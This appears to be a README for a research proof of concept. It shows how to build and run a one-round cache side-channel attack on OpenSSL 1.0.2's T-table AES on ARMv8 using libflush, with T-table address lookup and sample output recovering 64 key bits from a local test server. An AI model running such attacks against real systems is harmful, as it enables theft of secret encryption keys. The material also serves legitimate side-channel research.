# sync-aes-one-round attack

1. [How to build]
2. [How to run]

# 1. How to build for ARMv8

* build
```
$ cd lib/openssl-1.0.2
$ ./build_armv8.sh
$ cd ../libflush
$ make ARCH=armv8
$ cd ../../attack/sync-aes-one-round
$ ./build_armv8.sh
```

* clean
```
$ cd lib/openssl-1.0.2
$ ./clean.sh
$ cd../libflush
$ ./clean.sh
$ cd ../../attack/sync-aes-one-round
$ ./clean.sh
```

# 2. How to run

* Get T-table address (on host)
```
$ nm lib/openssl-1.0.2/libcrypto.so.1.0.0 | grep Te0
  0000000000166ec0 r Te0
$ nm lib/openssl-1.0.2/libcrypto.so.1.0.0 | grep Te1
  0000000000166ac0 r Te1
$ nm lib/openssl-1.0.2/libcrypto.so.1.0.0 | grep Te2
  00000000001666c0 r Te2
$ nm lib/openssl-1.0.2/libcrypto.so.1.0.0 | grep Te3
  00000000001662c0 r Te3
```

* Install binaries
```
$ (attack/sync-aes-one-round/server
   attack/sync-aes-one-round/attack
   attack/sync-aes-one-round/plain.txt
   lib/openssl-1.0.2/libcrypto.so.1.0.0)
   ==> install above 4 files to your device.
```

* Run attack (on device)
```
$ ./server &
  server is running
$ ./attack 3000 250 00166ec0 00166ac0 001666c0 001662c0 0 /usr/lib/libcrypto.so.1.0.0
  [attack info]
  ....
  progress : 100 / 3000
  ....
  real key :
  9e41005fd9a0c228e7b4312994aa4dc7
  infer key :
  90400050d0a0c020e0b0302090a040c0
  recover bits : 64
  end msg : end
  [1]+  Done                    ./server
```

